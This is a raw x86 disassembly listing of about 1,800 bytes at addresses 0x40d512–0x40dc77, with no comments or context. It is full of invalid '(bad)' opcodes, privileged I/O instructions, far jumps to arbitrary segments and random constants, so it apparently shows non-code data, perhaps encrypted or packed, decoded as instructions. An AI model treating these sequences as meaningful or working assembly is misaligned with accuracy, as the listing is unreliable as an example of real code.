  40d512:	xor    DWORD PTR ds:0xd83098de,0xfffffff0
  40d519:	in     al,dx
  40d51a:	int    0x13
  40d51c:	cli    
  40d51d:	jge    0x40d550
  40d51f:	or     bh,bh
  40d521:	fxam   
  40d523:	and    al,0xc3
  40d525:	leave  
  40d526:	in     eax,0x34
  40d528:	jecxz  0x40d55f
  40d52a:	mov    ds:0x14ac27f1,eax
  40d52f:	jno    0x40d4c5
  40d531:	push   eax
  40d532:	std    
  40d533:	mov    edi,DWORD PTR [ebp-0x5f]
  40d536:	lods   eax,DWORD PTR ds:[esi]
  40d537:	inc    edx
  40d538:	(bad)  
  40d539:	(bad)  
  40d53a:	jmp    0x8b91:0x37dedae0
  40d541:	or     al,0x18
  40d543:	imul   eax,DWORD PTR [edi+0x43a69f4e],0x96134699
  40d54d:	pop    ebx
  40d54e:	retf   
  40d54f:	fimul  DWORD PTR ds:0x13937a2
  40d555:	xchg   ebp,eax
  40d556:	test   al,0x1b
  40d558:	out    dx,al
  40d559:	fwait
  40d55a:	je     0x40d4e1
  40d55c:	stc    
  40d55d:	xchg   esp,eax
  40d55e:	sbb    eax,eax
  40d560:	push   cs
  40d561:	cli    
  40d562:	jmp    0x40d52e
  40d564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d565:	sub    eax,0x8a08561a
  40d56a:	and    eax,0x58ea9363
  40d56f:	rcr    cl,0x83
  40d572:	in     al,0xe7
  40d574:	inc    esi
  40d575:	jae    0x40d540
  40d577:	mov    ch,0xee
  40d579:	sub    eax,0x313c2423
  40d57e:	mov    al,0xb4
  40d580:	loope  0x40d5c9
  40d582:	xchg   ebp,eax
  40d583:	(bad)  
  40d584:	js     0x40d53a
  40d586:	in     al,dx
  40d587:	mov    BYTE PTR [edx+0x4d843512],dl
  40d58d:	inc    eax
  40d58e:	(bad)  
  40d58f:	ins    DWORD PTR es:[edi],dx
  40d590:	retf   
  40d591:	mov    cl,0x66
  40d593:	loop   0x40d607
  40d595:	or     dl,BYTE PTR [ecx+0x61f5af]
  40d59b:	inc    esi
  40d59c:	jp     0x40d59e
  40d59e:	fcmovbe st,st(3)
  40d5a0:	xor    BYTE PTR [ecx+0x59],cl
  40d5a3:	or     edx,DWORD PTR [eax]
  40d5a5:	adc    al,ch
  40d5a7:	xlat   BYTE PTR ds:[ebx]
  40d5a8:	dec    eax
  40d5a9:	adc    ebp,ebp
  40d5ab:	out    dx,eax
  40d5ac:	in     eax,dx
  40d5ad:	enter  0x9fba,0xc0
  40d5b1:	mov    bh,0x59
  40d5b3:	test   edx,ecx
  40d5b5:	outs   dx,DWORD PTR ds:[esi]
  40d5b6:	mov    ecx,0xd646a677
  40d5bb:	call   0x5439:0x2e24833
  40d5c2:	xchg   esi,eax
  40d5c3:	or     ah,al
  40d5c5:	push   ecx
  40d5c6:	or     dl,al
  40d5c8:	sbb    ebx,edi
  40d5ca:	stos   BYTE PTR es:[edi],al
  40d5cb:	jno    0x40d566
  40d5cd:	int    0xd6
  40d5cf:	aas    
  40d5d0:	adc    ebx,DWORD PTR [ebp-0x20]
  40d5d3:	dec    ecx
  40d5d4:	push   ss
  40d5d5:	rcr    BYTE PTR [ecx-0x2],0x2a
  40d5d9:	lea    edx,[esi+0x46c60ee2]
  40d5df:	lock push esi
  40d5e1:	aaa    
  40d5e2:	mov    al,ds:0xe54a8cce
  40d5e7:	jae    0x40d5e8
  40d5e9:	call   DWORD PTR [eax+0x2d]
  40d5ec:	loopne 0x40d643
  40d5ee:	push   edi
  40d5ef:	rcl    DWORD PTR [ecx],cl
  40d5f1:	sbb    ebp,DWORD PTR [ebp-0xdd747e3]
  40d5f7:	stc    
  40d5f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f9:	fisttp WORD PTR [edi+edi*4+0x7c]
  40d5fd:	call   0xd3f4:0xbe809942
  40d604:	cs icebp 
  40d606:	pop    ds
  40d607:	or     BYTE PTR [esi-0x80],0x41
  40d60b:	mov    eax,0x365dac11
  40d610:	add    DWORD PTR [ebx],esi
  40d612:	push   0x7bae7027
  40d617:	xchg   ebx,eax
  40d618:	jne    0x40d5c4
  40d61a:	xor    al,0xc4
  40d61c:	test   DWORD PTR [esi],esp
  40d61e:	dec    edx
  40d61f:	cdq    
  40d620:	nop
  40d621:	mov    esp,0xc2044b41
  40d626:	jge    0x40d66b
  40d628:	jb     0x40d5b8
  40d62a:	fidivr WORD PTR [edi-0x40]
  40d62d:	ret    
  40d62e:	cdq    
  40d62f:	add    dl,bh
  40d631:	mov    esi,0x49ed62f6
  40d636:	sete   BYTE PTR [edx]
  40d639:	xchg   dl,al
  40d63b:	jmp    0xa757b373
  40d640:	(bad)  
  40d641:	pop    DWORD PTR [esi+0x2920904b]
  40d647:	imul   eax,DWORD PTR [esi],0x8bee2e74
  40d64d:	add    DWORD PTR [esi+0x29bf56c6],ebp
  40d653:	nop
  40d654:	pop    ds
  40d655:	lods   al,BYTE PTR ds:[esi]
  40d656:	sar    DWORD PTR [ebp+0x64ac4f17],0xf4
  40d65d:	shl    ebp,1
  40d65f:	jne    0x40d6a0
  40d661:	inc    eax
  40d662:	sub    ecx,DWORD PTR [ebx]
  40d664:	retf   0x353f
  40d667:	mov    ds:0xebc02ffb,eax
  40d66c:	jne    0x40d669
  40d66e:	(bad)  [ebx]
  40d670:	xchg   esi,eax
  40d671:	and    DWORD PTR [eax-0x7c],ecx
  40d674:	mov    edi,0xd6ae5202
  40d679:	and    dh,dl
  40d67b:	(bad)  
  40d67c:	cmp    eax,edi
  40d67e:	inc    edx
  40d67f:	adc    edi,ebp
  40d681:	mov    bl,0xdd
  40d683:	lock pop eax
  40d685:	sub    al,0x1b
  40d687:	sub    esi,DWORD PTR [ebp+ecx*4-0x649ff30c]
  40d68e:	mov    edi,0x3d95da2b
  40d693:	xchg   edi,eax
  40d694:	pop    ss
  40d695:	jecxz  0x40d634
  40d697:	jno    0x40d63a
  40d699:	in     al,dx
  40d69a:	mov    cl,0xa
  40d69c:	cli    
  40d69d:	mov    esp,DWORD PTR ds:0x5ea167b8
  40d6a3:	fld    TBYTE PTR [edx-0x34436815]
  40d6a9:	add    ecx,esp
  40d6ab:	sbb    cl,dh
  40d6ad:	stc    
  40d6ae:	mov    WORD PTR [eax+ebx*2-0x420ac0c],?
  40d6b5:	mov    eax,DWORD PTR [ebx]
  40d6b7:	xor    dl,BYTE PTR [esi-0x30]
  40d6ba:	mov    esp,ds
  40d6bc:	loopne 0x40d6cb
  40d6be:	and    DWORD PTR [edx-0x60d3f54f],0x4e5cea47
  40d6c8:	in     eax,dx
  40d6c9:	repz in al,0x60
  40d6cc:	inc    ecx
  40d6cd:	ins    DWORD PTR es:[edi],dx
  40d6ce:	fld    TBYTE PTR ss:[edx+0x16ae89e4]
  40d6d5:	xor    bh,BYTE PTR [ecx+0x66]
  40d6d8:	or     eax,0x2884458e
  40d6dd:	int    0x8e
  40d6df:	dec    edx
  40d6e0:	fs dec esp
  40d6e2:	cmp    al,0xf1
  40d6e4:	mov    ecx,0xc4c3b0ba
  40d6e9:	sar    DWORD PTR [eax],0x77
  40d6ec:	daa    
  40d6ed:	adc    bl,dh
  40d6ef:	test   dl,al
  40d6f1:	pushf  
  40d6f2:	jbe    0x40d73e
  40d6f4:	inc    edi
  40d6f5:	or     DWORD PTR [eax],esi
  40d6f7:	sar    BYTE PTR [esi],cl
  40d6f9:	bound  edx,QWORD PTR [eax]
  40d6fb:	adc    al,dh
  40d6fd:	or     eax,0x45b4459b
  40d702:	mov    ah,0x21
  40d704:	call   0xbb25:0x32c92be3
  40d70b:	or     bh,BYTE PTR [esi+0x2b]
  40d70e:	ss loop 0x40d6df
  40d711:	jno    0x40d6d9
  40d713:	or     BYTE PTR [eax],dh
  40d715:	lds    edi,FWORD PTR [edi*1+0x484a4580]
  40d71c:	call   0x35d4b22b
  40d721:	ja     0x40d791
  40d723:	sub    bh,BYTE PTR [edx-0xb8fc810]
  40d729:	adc    al,0x95
  40d72b:	xor    eax,0xa3af737c
  40d730:	fs into 
  40d732:	add    BYTE PTR [edi+0xd],dh
  40d735:	les    edi,FWORD PTR [edx-0x638ac875]
  40d73b:	test   eax,0x22906c64
  40d740:	jle    0x40d75b
  40d742:	imul   esi,DWORD PTR [eax],0xa40d71c4
  40d748:	in     eax,dx
  40d749:	mov    ds:0xf3ab840f,al
  40d74e:	fisttp QWORD PTR [eax+0x73421fae]
  40d754:	cmp    edi,DWORD PTR [edi]
  40d756:	dec    eax
  40d757:	inc    esp
  40d758:	imul   ebp,DWORD PTR [esi-0x42],0xffffffe4
  40d75c:	push   0x11a483c1
  40d761:	and    eax,0xad1db926
  40d766:	nop
  40d767:	shr    DWORD PTR [ebx+0x65],cl
  40d76a:	scas   eax,DWORD PTR es:[edi]
  40d76b:	mov    ds:0x710a780f,eax
  40d770:	retf   0xec12
  40d773:	shr    dl,0x5e
  40d776:	pop    ebx
  40d777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d779:	pusha  
  40d77a:	cmp    BYTE PTR [esi-0x9],ch
  40d77d:	loopne 0x40d7b0
  40d77f:	mov    edi,0x494fb1e3
  40d784:	and    eax,0x9f17ed96
  40d789:	sub    eax,0x6718e5a
  40d78e:	fsub   DWORD PTR [ebp+0x53d8cf9f]
  40d794:	ror    BYTE PTR [esi],1
  40d796:	jae    0x40d72a
  40d798:	add    ah,BYTE PTR [edi]
  40d79a:	cmp    ebx,DWORD PTR [edx+eax*1-0x6a]
  40d79e:	xchg   ebp,eax
  40d79f:	jle    0x40d73f
  40d7a1:	sbb    DWORD PTR [eax+0x79],edi
  40d7a4:	loopne 0x40d75b
  40d7a6:	xchg   ebp,eax
  40d7a7:	clc    
  40d7a8:	push   esp
  40d7a9:	adc    al,0x6b
  40d7ab:	ins    DWORD PTR es:[edi],dx
  40d7ac:	dec    ebx
  40d7ad:	xor    dh,BYTE PTR [esi-0x63e676df]
  40d7b3:	mov    ah,0x9
  40d7b5:	mov    eax,0xf4df1f51
  40d7ba:	shl    DWORD PTR [ebx],1
  40d7bc:	dec    edx
  40d7bd:	jmp    0x40d78a
  40d7bf:	jo     0x40d832
  40d7c1:	adc    DWORD PTR [edi+0x9],esi
  40d7c4:	mov    ?,ecx
  40d7c6:	mov    ebx,DWORD PTR [eax-0xf]
  40d7c9:	inc    ebp
  40d7ca:	jae    0x40d83c
  40d7cc:	sub    al,0x92
  40d7ce:	aad    0x9a
  40d7d0:	or     eax,eax
  40d7d2:	xchg   edx,eax
  40d7d3:	push   esi
  40d7d4:	clc    
  40d7d5:	jg     0x40d81b
  40d7d7:	fidivr DWORD PTR [esi+0x7f0c496b]
  40d7dd:	repnz icebp 
  40d7df:	adc    DWORD PTR [eax+edx*1],ebp
  40d7e2:	xor    BYTE PTR [eax],ah
  40d7e4:	imul   esp,ebx,0x6a
  40d7e7:	sbb    DWORD PTR [edx-0x7c],ebx
  40d7ea:	jl     0x40d78f
  40d7ec:	fadd   QWORD PTR [edi-0x5f]
  40d7ef:	repz in al,0x94
  40d7f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7f3:	pop    esp
  40d7f4:	xchg   edx,eax
  40d7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7f6:	mov    eax,0x49622a43
  40d7fb:	pop    ds
  40d7fc:	rcr    DWORD PTR [ebx+0x76],0x12
  40d800:	lds    eax,FWORD PTR [esi+0x1e2edd29]
  40d806:	sar    DWORD PTR [ecx-0x4f29810e],cl
  40d80c:	outs   dx,DWORD PTR ds:[esi]
  40d80d:	jne    0x40d82c
  40d80f:	mov    ds:0xc903aa2,al
  40d814:	fwait
  40d815:	stc    
  40d816:	je     0x40d799
  40d818:	in     eax,0x1a
  40d81a:	jmp    0xb9cc:0x62caf0af
  40d821:	fs icebp 
  40d823:	(bad)  
  40d824:	jae    0x40d802
  40d826:	arpl   WORD PTR [edx-0x5310c979],ax
  40d82c:	sub    cl,BYTE PTR [ebp-0x36]
  40d82f:	inc    eax
  40d830:	cld    
  40d831:	mov    DWORD PTR [ebx-0x59],eax
  40d834:	rol    DWORD PTR [eax-0x3065e4],0x4c
  40d83b:	mov    ch,0x8
  40d83d:	enter  0xa676,0x30
  40d841:	popa   
  40d842:	fnstcw WORD PTR [esi+eax*2]
  40d845:	sar    DWORD PTR [ebp+0x707af627],0x48
  40d84c:	jns    0x40d807
  40d84e:	adc    eax,0xa2777727
  40d853:	aaa    
  40d854:	loop   0x40d8c3
  40d856:	or     esp,eax
  40d858:	retf   
  40d859:	lods   al,BYTE PTR ds:[esi]
  40d85a:	js     0x40d7f0
  40d85c:	not    BYTE PTR [edi-0x6e]
  40d85f:	or     DWORD PTR [esi],eax
  40d861:	or     esp,esp
  40d863:	call   0x3a8a1f7c
  40d868:	fild   WORD PTR [ebx]
  40d86a:	out    0xbf,eax
  40d86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d86d:	es dec esp
  40d86f:	(bad)  
  40d870:	cld    
  40d871:	pop    edi
  40d872:	loop   0x40d8e6
  40d874:	mov    eax,ds:0x7689c2cb
  40d879:	push   ebx
  40d87a:	ja     0x40d86b
  40d87c:	shr    DWORD PTR cs:[edx-0x29],0x1b
  40d881:	(bad)  
  40d882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d883:	mov    cl,0xa1
  40d885:	pop    eax
  40d886:	adc    DWORD PTR [edi+ecx*2+0x5d223bda],esp
  40d88d:	sub    al,0x46
  40d88f:	add    DWORD PTR [ebp+0x47],esp
  40d892:	mov    esi,0x2476d9f3
  40d897:	cdq    
  40d898:	in     eax,dx
  40d899:	dec    eax
  40d89a:	inc    esp
  40d89b:	xor    al,0xc3
  40d89d:	inc    BYTE PTR [edx]
  40d89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8a0:	in     al,0x3a
  40d8a2:	mov    ebx,0xc474517c
  40d8a7:	lea    ebp,[eax]
  40d8a9:	xor    BYTE PTR [ebx],ch
  40d8ab:	unpckhps xmm2,xmm3
  40d8ae:	in     al,dx
  40d8af:	pushf  
  40d8b0:	jge    0x40d8b7
  40d8b2:	stc    
  40d8b3:	mov    ds,WORD PTR [eax+0x36b94420]
  40d8b9:	mov    edx,0x2be97ddd
  40d8be:	adc    al,0x5
  40d8c0:	pushf  
  40d8c1:	mov    al,BYTE PTR [edi]
  40d8c3:	ret    
  40d8c4:	hlt    
  40d8c5:	mov    esi,0xf60b7f81
  40d8ca:	jo     0x40d851
  40d8cc:	ror    BYTE PTR [eax-0x4dfc0013],1
  40d8d2:	iret   
  40d8d3:	int3   
  40d8d4:	dec    ebx
  40d8d5:	icebp  
  40d8d6:	push   edx
  40d8d7:	iret   
  40d8d8:	mov    DWORD PTR [edi-0x52075666],0x66a94b97
  40d8e2:	push   edi
  40d8e3:	fwait
  40d8e4:	xor    ch,BYTE PTR [edi]
  40d8e6:	ja     0x40d886
  40d8e8:	imul   edx,DWORD PTR [ecx+0x43],0x188d6501
  40d8ef:	imul   ebp,DWORD PTR [ebx-0x20],0xffffff82
  40d8f3:	xor    DWORD PTR [edi],0x74313992
  40d8f9:	retf   
  40d8fa:	cwde   
  40d8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fc:	icebp  
  40d8fd:	leave  
  40d8fe:	add    edi,esp
  40d900:	es and al,0xe4
  40d903:	push   0x919471b2
  40d908:	stos   BYTE PTR es:[edi],al
  40d909:	jno    0x40d88d
  40d90b:	xor    DWORD PTR [esi-0xb],esp
  40d90e:	xchg   ebp,eax
  40d90f:	adc    al,0xd
  40d911:	xor    eax,0x883bca82
  40d916:	xor    ecx,DWORD PTR [ebp-0x7ce00e2b]
  40d91c:	xor    DWORD PTR [edx-0x1fc50400],eax
  40d922:	into   
  40d923:	ss pop ecx
  40d925:	stc    
  40d926:	fstp   TBYTE PTR [ebp+0x53863b0c]
  40d92c:	fs ja  0x40d8ee
  40d92f:	lock in al,dx
  40d931:	test   eax,0x5f52c65c
  40d936:	sub    DWORD PTR ds:0x6b30f576,edi
  40d93c:	(bad)  
  40d93d:	(bad)  
  40d93f:	sar    dl,0x1c
  40d942:	push   cs
  40d943:	jnp    0x40d987
  40d945:	mov    WORD PTR [edi],es
  40d947:	jnp    0x40d8f8
  40d949:	out    0x4f,eax
  40d94b:	out    0xfe,al
  40d94d:	push   es
  40d94e:	push   ebx
  40d94f:	mov    eax,0xf6cfeacf
  40d954:	xchg   esp,eax
  40d955:	and    eax,0xf68b5aec
  40d95a:	xor    BYTE PTR [edi],bl
  40d95c:	push   ebx
  40d95d:	or     al,0x31
  40d95f:	loope  0x40d93a
  40d961:	cmp    al,0x3e
  40d963:	push   eax
  40d964:	xchg   ebp,eax
  40d965:	mov    DWORD PTR [eax],esp
  40d967:	push   edx
  40d968:	mov    ebp,0x6a557c06
  40d96d:	cmp    ah,BYTE PTR [ebx]
  40d96f:	push   esp
  40d970:	jg     0x40d999
  40d972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d973:	fwait
  40d974:	sti    
  40d975:	pop    esi
  40d976:	sbb    bl,BYTE PTR [edi-0x52]
  40d979:	leave  
  40d97a:	(bad)  
  40d97b:	outs   dx,BYTE PTR ds:[esi]
  40d97c:	sar    edi,0xb1
  40d97f:	cmc    
  40d980:	or     ecx,edi
  40d982:	mov    cl,0x1
  40d984:	push   edx
  40d985:	push   ecx
  40d986:	pop    ebx
  40d987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d988:	jecxz  0x40d922
  40d98a:	and    al,0x64
  40d98c:	cwde   
  40d98d:	daa    
  40d98e:	jmp    0x40d9d7
  40d990:	jg     0x40d9de
  40d992:	sub    al,0x6c
  40d994:	enter  0xf7c6,0xb5
  40d998:	pop    ebx
  40d999:	out    0xf4,eax
  40d99b:	mov    esp,0x7f36e6d9
  40d9a0:	pop    ebx
  40d9a1:	dec    eax
  40d9a2:	lods   al,BYTE PTR ds:[esi]
  40d9a3:	push   es
  40d9a4:	jno    0x40d92a
  40d9a6:	add    al,BYTE PTR [edi-0x31]
  40d9a9:	mov    edx,0x23ea1a41
  40d9ae:	push   0x32
  40d9b0:	fcom   QWORD PTR [edx-0x65]
  40d9b3:	loopne 0x40d98a
  40d9b5:	pop    ebp
  40d9b6:	jg     0x40d9a1
  40d9b8:	dec    esp
  40d9b9:	cwde   
  40d9ba:	pop    ss
  40d9bb:	fwait
  40d9bc:	test   ah,ah
  40d9be:	inc    esp
  40d9bf:	xchg   ebx,eax
  40d9c0:	xchg   edx,edi
  40d9c2:	lods   eax,DWORD PTR ds:[esi]
  40d9c3:	pop    eax
  40d9c4:	push   ds
  40d9c5:	scas   eax,DWORD PTR es:[edi]
  40d9c6:	fsubp  st(6),st
  40d9c8:	test   BYTE PTR [edi-0x283c1eb4],dh
  40d9ce:	cdq    
  40d9cf:	ins    BYTE PTR es:[edi],dx
  40d9d0:	pop    ecx
  40d9d1:	dec    ecx
  40d9d2:	sub    eax,0x52303bfa
  40d9d7:	sub    al,0xde
  40d9d9:	fstp   TBYTE PTR [esi-0x56bdc266]
  40d9df:	dec    ebp
  40d9e0:	shr    DWORD PTR [ebp-0x24],1
  40d9e3:	outs   dx,DWORD PTR ds:[esi]
  40d9e4:	pop    ecx
  40d9e5:	int3   
  40d9e6:	sar    BYTE PTR [eax],1
  40d9e8:	cmp    eax,0x61c46742
  40d9ed:	xchg   edi,eax
  40d9ee:	sahf   
  40d9ef:	inc    esi
  40d9f0:	or     dl,dl
  40d9f2:	cmp    al,0xb
  40d9f4:	add    eax,0x85d0dbdd
  40d9f9:	mov    dh,0x40
  40d9fb:	jp     0x40d9a3
  40d9fd:	in     al,dx
  40d9fe:	add    DWORD PTR [edi+ecx*8+0x3b0d0808],ebp
  40da05:	push   es
  40da06:	sti    
  40da07:	inc    ecx
  40da08:	mov    ?,WORD PTR [esi+0x642324f1]
  40da0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da0f:	addr16 mov dh,0xf7
  40da12:	mov    bh,0x89
  40da14:	pop    es
  40da15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da16:	xchg   ebp,eax
  40da17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da18:	inc    ebx
  40da19:	or     al,0x2b
  40da1b:	shr    ecx,0x87
  40da1e:	popa   
  40da1f:	cdq    
  40da20:	cmove  eax,DWORD PTR [ebx-0x3380aa9c]
  40da27:	xchg   esp,ecx
  40da29:	jbe    0x40da28
  40da2b:	xchg   esi,eax
  40da2c:	fisubr DWORD PTR [esp+esi*1-0x31]
  40da30:	(bad)  
  40da31:	outs   dx,BYTE PTR ds:[esi]
  40da32:	cld    
  40da33:	rol    DWORD PTR [ebx+0x3c],0x87
  40da37:	mov    eax,ds:0x879f0646
  40da3c:	or     ebx,ebp
  40da3e:	cld    
  40da3f:	cmc    
  40da40:	cld    
  40da41:	imul   esi,esp,0xffd0eb06
  40da47:	fcom   DWORD PTR [edi-0x4d]
  40da4a:	ds pop esp
  40da4c:	les    edx,FWORD PTR [edx]
  40da4e:	retf   
  40da4f:	rcl    ebx,cl
  40da51:	mov    dl,BYTE PTR [edx-0x2b1db7af]
  40da57:	xchg   ecx,eax
  40da58:	add    DWORD PTR [ebp-0x3f],edx
  40da5b:	es mov bl,0x4c
  40da5e:	fisttp DWORD PTR [edx+edi*1-0x53]
  40da62:	shr    DWORD PTR [esi],0xed
  40da65:	push   cs
  40da66:	mov    ebp,0x75e50fa
  40da6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da6c:	pusha  
  40da6d:	xchg   edi,eax
  40da6e:	or     ebx,ebp
  40da70:	add    DWORD PTR ds:0x857dc0c7,ebp
  40da76:	and    esi,DWORD PTR [edi+0x2e]
  40da79:	imul   ebp,DWORD PTR [esi+0x14059a90],0xffffffdd
  40da80:	cmc    
  40da81:	jle    0x40daa4
  40da83:	fcom   st(0)
  40da85:	mov    ecx,?
  40da87:	sbb    BYTE PTR [ebx-0x58],bl
  40da8a:	ret    0x6723
  40da8d:	or     al,0x8
  40da8f:	jmp    0x7b21166a
  40da94:	daa    
  40da95:	arpl   WORD PTR [edx+ecx*2-0x1b431173],cx
  40da9c:	aas    
  40da9d:	daa    
  40da9e:	stos   BYTE PTR es:[edi],al
  40da9f:	xchg   ebx,eax
  40daa0:	jno    0x40da2e
  40daa2:	pop    ss
  40daa3:	rol    BYTE PTR [ecx],0xae
  40daa6:	mov    eax,ds:0x6a41c426
  40daab:	shl    edi,cl
  40daad:	cwde   
  40daae:	xor    DWORD PTR [ebx],edx
  40dab0:	outs   dx,DWORD PTR ds:[esi]
  40dab1:	scas   al,BYTE PTR es:[edi]
  40dab2:	test   eax,0x98a2c562
  40dab7:	and    edi,DWORD PTR [esi+eax*8+0x356e057f]
  40dabe:	cli    
  40dabf:	pop    ss
  40dac0:	push   0x194eb9ae
  40dac5:	cmp    DWORD PTR [edx+0xc],ebx
  40dac8:	or     BYTE PTR ds:0x7ba88982,0x72
  40dacf:	idiv   BYTE PTR [edi-0x3b]
  40dad2:	sti    
  40dad3:	fadd   QWORD PTR [ebx]
  40dad5:	xchg   esi,eax
  40dad6:	inc    ecx
  40dad7:	test   ebp,esi
  40dad9:	ja     0x40da97
  40dadb:	cli    
  40dadc:	stc    
  40dadd:	outs   dx,BYTE PTR ds:[esi]
  40dade:	sub    BYTE PTR [ebx+eiz*4-0x38],bh
  40dae2:	imul   edx,DWORD PTR [ecx],0x770df631
  40dae8:	jne    0x40db65
  40daea:	push   ebx
  40daeb:	test   DWORD PTR [edi],0x8e4cafe2
  40daf1:	and    eax,edx
  40daf3:	cmp    dl,dl
  40daf5:	cli    
  40daf6:	clc    
  40daf7:	pop    ebp
  40daf8:	add    eax,0x1c396712
  40dafd:	inc    eax
  40dafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daff:	retf   0xcb12
  40db02:	cdq    
  40db03:	push   edx
  40db04:	xlat   BYTE PTR ds:[ebx]
  40db05:	int3   
  40db06:	call   0x83794193
  40db0b:	(bad)  
  40db0c:	lock mov ebx,0x30b001e1
  40db12:	push   cs
  40db13:	repnz mov BYTE PTR [ebp-0x6e],bh
  40db17:	outs   dx,BYTE PTR ds:[esi]
  40db18:	jp     0x40db55
  40db1a:	xor    DWORD PTR [ebp-0x27],ebp
  40db1d:	mov    edi,0xcff0d87b
  40db22:	dec    edx
  40db23:	shr    BYTE PTR [esi-0x5],1
  40db26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db27:	std    
  40db28:	or     eax,0x4aeda175
  40db2d:	xchg   edx,eax
  40db2e:	xchg   ecx,eax
  40db2f:	mul    BYTE PTR [esi+0x1a]
  40db32:	in     eax,dx
  40db33:	je     0x40db4f
  40db35:	fdivr  st,st(7)
  40db37:	fiadd  DWORD PTR [esp+eiz*2]
  40db3a:	sahf   
  40db3b:	inc    esi
  40db3c:	xchg   esp,eax
  40db3d:	dec    esp
  40db3e:	iret   
  40db3f:	sbb    ch,bh
  40db41:	lds    edi,FWORD PTR [edi]
  40db43:	repnz in eax,0x37
  40db46:	idiv   edi
  40db48:	sub    al,cl
  40db4a:	dec    esi
  40db4b:	outs   dx,DWORD PTR ds:[esi]
  40db4c:	mov    esi,0x803e9dc3
  40db51:	push   cs
  40db52:	or     esp,esi
  40db54:	adc    esi,DWORD PTR [esi+0x1166fdd0]
  40db5a:	push   ecx
  40db5b:	retf   0xa37c
  40db5e:	xchg   edx,eax
  40db5f:	jns    0x40db20
  40db61:	push   0x6199973e
  40db66:	and    ecx,0x620adf3d
  40db6c:	pop    ebx
  40db6d:	jno    0x40db75
  40db6f:	das    
  40db70:	or     eax,0xf5fb54ec
  40db75:	pop    eax
  40db76:	or     eax,DWORD PTR [esi-0x14fb79aa]
  40db7c:	popf   
  40db7d:	push   0x6eee3d88
  40db82:	sbb    eax,ebp
  40db84:	sbb    al,0x2f
  40db86:	call   0x1ca551ac
  40db8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db8c:	or     BYTE PTR [esi],0x77
  40db8f:	gs loope 0x40dbc0
  40db92:	adc    al,0x11
  40db94:	(bad)  
  40db95:	mov    ebx,0x4605fd4a
  40db9a:	xchg   edx,ebx
  40db9c:	xor    DWORD PTR [edi],eax
  40db9e:	xchg   esi,eax
  40db9f:	imul   ebx,ebx,0xffffffbf
  40dba2:	test   eax,0x7b82b533
  40dba7:	adc    al,BYTE PTR [edx-0x58e2bb54]
  40dbad:	push   eax
  40dbae:	inc    edi
  40dbaf:	icebp  
  40dbb0:	jmp    0x40dc09
  40dbb2:	adc    dh,BYTE PTR [ebx]
  40dbb4:	jl     0x40dc1a
  40dbb6:	mov    ecx,0xd323f064
  40dbbb:	ins    BYTE PTR es:[edi],dx
  40dbbc:	jmp    0x40dbf6
  40dbbe:	in     eax,0xbd
  40dbc0:	ds mov cl,0x50
  40dbc3:	pop    esp
  40dbc4:	inc    eax
  40dbc5:	inc    esp
  40dbc6:	xchg   bl,ch
  40dbc8:	adc    ah,ch
  40dbca:	mov    esi,0x242eb4a3
  40dbcf:	dec    ebx
  40dbd0:	jmp    0x21b:0x56ddf1b8
  40dbd7:	jmp    0x3506:0xacf155da
  40dbde:	pop    ebp
  40dbdf:	and    DWORD PTR [edx],0x275dc2b8
  40dbe5:	pop    es
  40dbe6:	or     al,0xf1
  40dbe8:	dec    edi
  40dbe9:	jmp    0x67c86038
  40dbee:	push   ds
  40dbef:	mov    ah,0x4b
  40dbf1:	fsubr  DWORD PTR [ecx]
  40dbf3:	pusha  
  40dbf4:	push   0x32
  40dbf6:	jne    0x40dc20
  40dbf8:	loop   0x40dc2d
  40dbfa:	js     0x40dc25
  40dbfc:	xchg   edi,eax
  40dbfd:	call   0xae99:0x7697b892
  40dc04:	dec    esp
  40dc05:	xor    cl,BYTE PTR [ebx+0x2]
  40dc08:	rcl    BYTE PTR [ebx-0x298d9e6c],cl
  40dc0e:	pop    ebp
  40dc0f:	mov    DWORD PTR ds:0x7dc0e3ba,esp
  40dc15:	mov    edi,0xe0a04c6b
  40dc1a:	mul    BYTE PTR [ebx]
  40dc1c:	stos   BYTE PTR es:[edi],al
  40dc1d:	or     ebp,DWORD PTR [ecx+0x5c215eb4]
  40dc23:	pusha  
  40dc24:	sahf   
  40dc25:	inc    ecx
  40dc26:	out    dx,al
  40dc27:	jmp    0xa510:0xa4198333
  40dc2e:	ret    0xec2c
  40dc31:	adc    ah,0xc6
  40dc34:	mov    ecx,0x6f5af3c
  40dc39:	and    edi,DWORD PTR [ebx-0x6c]
  40dc3c:	shl    DWORD PTR [edx+0x59],0xd6
  40dc40:	outs   dx,BYTE PTR ds:[esi]
  40dc41:	popf   
  40dc42:	jmp    0x59f43663
  40dc47:	je     0x40dc90
  40dc49:	jecxz  0x40dc43
  40dc4b:	xor    BYTE PTR [edi+0x6c73a8bf],ch
  40dc51:	fistp  DWORD PTR [edi]
  40dc53:	(bad)  
  40dc54:	cld    
  40dc55:	ror    DWORD PTR [ecx+0x5cc1099e],1
  40dc5b:	not    edi
  40dc5d:	stos   DWORD PTR es:[edi],eax
  40dc5e:	retf   0x906e
  40dc61:	les    ebx,FWORD PTR [eax+ecx*1-0xefd3073]
  40dc68:	fnstsw WORD PTR [ebp+0x45]
  40dc6b:	aam    0xb5
  40dc6d:	fs fldl2e 
  40dc70:	loop   0x40dca0
  40dc72:	int3   
  40dc73:	push   0xffffffe6
  40dc75:	test   cl,cl
  40dc77:	loope  0x40dbff
